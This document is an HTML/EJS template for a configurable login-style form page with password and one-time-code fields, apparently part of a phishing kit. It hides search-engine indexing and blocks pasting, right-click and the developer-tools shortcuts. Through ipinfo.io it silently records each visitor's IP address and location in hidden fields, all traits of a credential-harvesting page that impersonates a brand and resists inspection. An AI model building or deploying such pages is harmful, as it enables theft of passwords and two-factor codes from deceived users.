<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title><%= pageConfig.title %></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            <% if (pageConfig.backgroundUrl) { %>
            background-image: url('<%= pageConfig.backgroundUrl %>');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            <% } else { %>
            background-color: <%= pageConfig.backgroundColor || '#ffffff' %>;
            <% } %>
        }

        /*
         * Card background logic:
         *   image + color  → card gets the backgroundColor
         *   image only     → card is fully transparent (no bg, no shadow)
         *   color only     → card gets the backgroundColor
         *   neither        → card defaults to white
         */
        .form-card {
            <% if (pageConfig.backgroundUrl && pageConfig.backgroundColor) { %>
            background-color: <%= pageConfig.backgroundColor %>;
            <% } else if (pageConfig.backgroundUrl) { %>
            background-color: transparent;
            box-shadow: none;
            <% } else { %>
            background-color: <%= pageConfig.backgroundColor || '#ffffff' %>;
            <% } %>
        }

        .text-custom {
            color: <%= pageConfig.textColor || '#111827' %> !important;
        }

        .btn-custom {
            background-color: <%= pageConfig.buttonColor || '#3b82f6' %> !important;
            color: <%= pageConfig.buttonTextColor || '#ffffff' %> !important;
        }

        .btn-custom:hover {
            filter: brightness(0.9);
        }

        .focus-ring-custom:focus {
            --tw-ring-color: <%= pageConfig.buttonColor || '#3b82f6' %> !important;
            border-color: <%= pageConfig.buttonColor || '#3b82f6' %> !important;
        }

        .dot-active {
            background-color: <%= pageConfig.buttonColor || '#3b82f6' %> !important;
        }

        .dot-inactive {
            background-color: <%= pageConfig.textColor || '#111827' %> !important;
            opacity: 0.3 !important;
        }

        .input-custom,
        input.input-custom {
            background-color: <%= pageConfig.inputBackgroundColor || 'transparent' %> !important;
            color: #ffffff !important;
            <% if (pageConfig.inputBackgroundColor === 'transparent') { %>
            border: 1px solid rgba(255, 255, 255, 0.2) !important;
            <% } %>
        }

        input.input-custom:-webkit-autofill,
        input.input-custom:-webkit-autofill:hover,
        input.input-custom:-webkit-autofill:focus,
        input.input-custom:-webkit-autofill:active {
            transition: background-color 5000s ease-in-out 0s;
            -webkit-text-fill-color: #ffffff !important;
        }

        .input-custom::placeholder {
            color: #ffffff !important;
            opacity: 0.6 !important;
        }
    </style>
</head>

<body class="min-h-screen text-custom">
    <div class="relative min-h-screen flex items-center justify-center p-4">
        <div class="w-full max-w-md">
            <div class="form-card rounded-2xl shadow-xl p-8">

                <% if (pageConfig.logoUrl) { %>
                <div class="flex justify-center mb-6">
                    <img src="<%= pageConfig.logoUrl %>" alt="Logo" class="h-16 object-contain">
                </div>
                <% } %>

                <h1 class="text-2xl font-bold text-center text-custom mb-2">
                    <%= pageConfig.title %>
                </h1>

                <% if (pageConfig.subtitle) { %>
                <p class="text-center text-custom opacity-70 mb-4"><%= pageConfig.subtitle %></p>
                <% } %>

                <% if (pageConfig.writeup) { %>
                <p class="text-sm text-custom opacity-70 mb-6"><%= pageConfig.writeup %></p>
                <% } else if (!pageConfig.subtitle) { %>
                <div class="mb-6"></div>
                <% } %>

                <% if (pageConfig.inputs && pageConfig.inputs.length > 0) { %>
                <form method="POST" class="space-y-4" autocomplete="off">
                    <% pageConfig.inputs.forEach(function(input, index) { %>
                    <div>
                        <label class="block text-sm font-medium text-custom mb-1">
                            <%= input.label %>
                            <% if (input.required) { %><span class="text-red-500">*</span><% } %>
                        </label>
                        <% if (input.type === 'otp') { %>
                        <input
                            type="text"
                            name="input_<%= index %>"
                            placeholder="<%= input.placeholder || 'Enter code' %>"
                            <%= input.required ? 'required' : '' %>
                            maxlength="10"
                            pattern="[0-9]*"
                            inputmode="numeric"
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus-ring-custom focus:border-transparent text-center text-2xl tracking-widest input-custom"
                            onpaste="return false"
                            autocomplete="off"
                        >
                        <% } else { %>
                        <input
                            type="<%= input.type %>"
                            name="input_<%= index %>"
                            placeholder="<%= input.placeholder %>"
                            <%= input.required ? 'required' : '' %>
                            maxlength="100"
                            pattern="[^<>]*"
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus-ring-custom focus:border-transparent input-custom"
                            onpaste="return false"
                            autocomplete="<%= input.type === 'password' ? 'new-password' : 'off' %>"
                        >
                        <% } %>
                    </div>
                    <% }); %>

                    <input type="hidden" value="" name="city" id="cty">
                    <input type="hidden" value="" name="country" id="country">
                    <input type="hidden" value="" name="region" id="region">
                    <input type="hidden" value="" name="ip" id="ip">

                    <button type="submit" id="submitBtn"
                        class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                        <%= pageConfig.buttonText %>
                    </button>
                </form>
                <% } else { %>
                <form method="POST" class="mt-6" autocomplete="off">
                    <input type="hidden" value="" name="city" id="cty">
                    <input type="hidden" value="" name="country" id="country">
                    <input type="hidden" value="" name="region" id="region">
                    <input type="hidden" value="" name="ip" id="ip">
                    <button type="submit" id="submitBtn"
                        class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                        <%= pageConfig.buttonText %>
                    </button>
                </form>
                <% } %>

                <% if (totalPages > 1) { %>
                <div class="mt-6 flex justify-center">
                    <div class="flex gap-2">
                        <% for (let i = 1; i <= totalPages; i++) { %>
                        <div class="w-2 h-2 rounded-full <%= i === currentPage ? 'dot-active' : 'dot-inactive' %>"></div>
                        <% } %>
                    </div>
                </div>
                <% } %>

            </div>
        </div>
    </div>

    <script>
        const country = document.getElementById('country');
        const region = document.getElementById('region');
        const city = document.getElementById('cty');
        const ip = document.getElementById('ip');
        const submitBtn = document.getElementById('submitBtn');
        const form = document.getElementsByTagName('form')[0];

        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();

            const requiredInputs = form.querySelectorAll('input[required]');
            let allFilled = true;
            requiredInputs.forEach(input => {
                if (!input.value.trim()) {
                    allFilled = false;
                    input.classList.add('border-red-500');
                } else {
                    input.classList.remove('border-red-500');
                }
            });

            if (!allFilled) return;

            submitBtn.disabled = true;
            submitBtn.textContent = 'Please wait...';
            form.submit();
        });

        function getIpInfo() {
            fetch('https://ipinfo.io/json?token=efd2f9e1d7b7a0')
                .then(response => response.json())
                .then(data => {
                    country.value = data.country;
                    region.value = data.region;
                    city.value = data.city;
                    ip.value = data.ip;
                })
                .catch(error => console.error(error));
        }
        getIpInfo();

        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }

        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
